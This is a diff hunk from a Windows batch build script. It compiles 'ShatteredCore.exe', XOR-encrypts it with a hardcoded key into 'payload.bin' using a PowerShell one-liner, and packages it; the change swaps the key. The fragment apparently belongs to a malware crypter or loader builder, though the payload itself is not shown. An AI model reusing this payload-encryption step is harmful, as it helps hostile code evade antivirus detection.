@@ -12,7 +12,7 @@ advapi32.lib winhttp.lib bcrypt.lib user32.lib shell32.lib ^
 /Fe:ShatteredCore.exe
 
 echo [*] Encrypting Payload (ShatteredCore.exe -> payload.bin)...
-powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('ShatteredCore.exe');$k=[Text.Encoding]::ASCII.GetBytes('8FhiL1BWYqH2SB0Y');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]};[IO.File]::WriteAllBytes('payload.bin',$b)"
+powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('ShatteredCore.exe');$k=[Text.Encoding]::ASCII.GetBytes('GRbjmpN3kATFUNxY');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]};[IO.File]::WriteAllBytes('payload.bin',$b)"
 
 if not exist "payload.bin" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )
 echo [*] Packaging Resources...
